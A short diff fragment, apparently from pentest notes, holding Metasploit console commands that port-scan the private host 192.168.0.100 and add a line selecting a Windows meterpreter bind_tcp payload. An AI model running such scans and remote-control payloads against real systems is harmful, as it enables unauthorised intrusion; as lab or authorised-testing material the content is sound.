@@ -9,3 +9,5 @@ tcp:
 	use auxiliary/scanner/portscan/tcp
 	set RHOSTS 192.168.0.100
 	set PORTS 20-5000
+	use payload/windows/meterpreter/bind_tcp
+
